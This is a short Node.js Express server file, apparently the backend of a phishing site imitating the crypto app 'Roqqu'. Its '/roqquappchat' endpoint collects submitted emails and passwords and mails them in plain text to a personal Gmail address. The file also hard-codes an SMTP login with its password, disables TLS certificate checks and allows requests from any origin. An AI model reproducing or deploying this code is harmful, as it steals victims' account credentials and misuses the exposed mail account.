const express = require('express');
const app = express();
const nodemailer = require('nodemailer');


app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader(
        'Access-Control-Allow-Methods',
        'OPTIONS, GET, POST, PUT, PATCH, DELETE'
    )
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')

    if (req.method === 'OPTIONS') {
        return res.sendStatus(200)
    }
    next()
})

const transporter = nodemailer.createTransport({
    host: 'mail.growveonct.com',
    port: 465,
    secure: true,
    requireTLS: true,
    socketTimeout: 1200000,
    connectionTimeout: 1200000,
    auth: {
        user: 'admin@growveonct.com',
        pass: 'Panther1.?)0',
    },
    tls: {
        rejectUnauthorized: false,
    },
})

// verify connection configuration
transporter.verify(function(error, success) {
  if (error) {
    console.log(error);
  } else {
    console.log("Server is ready to take our messages");
  }
});


app.get('/', (req, res) =>{
  res.send('Welcome to roqq backend')
})

app.post('/roqquappchat', (req, res, next) => {
  console.log(
    'req body', req.body
  )

  const email = req.body.email
  const password = req.body.password
  const content = `email: ${email} \n password: ${password} `



  const mail = {
    from: 'admin@growveonct.com',
    to: 'ifestephenie@gmail.com',
    message: content,
    text: content
  }

  transporter.sendMail(mail, (err, data) => {
    if (err) {
      console.log({err})
      res.json({
        status: 'fail'
      })
    } else {
      res.json({
       status: 'success'
      })
    }
  })
})


const PORT = process.env.PORT || 3030
app.listen(PORT, () => console.info(`server has started on ${PORT}`))